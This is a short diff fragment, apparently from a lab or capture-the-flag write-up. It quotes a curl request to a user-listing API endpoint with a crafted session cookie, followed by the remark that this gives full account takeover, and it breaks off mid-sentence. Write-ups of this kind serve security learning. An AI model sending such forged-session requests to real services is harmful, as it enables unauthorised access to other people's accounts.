@@ -234,3 +234,4 @@ curl http://verbose.hsm/api/users/all -H 'Cookie: session=eyJyb2xlIjoidXNlciIsIn
 
 Its now full account takeover
 
+I can now lo
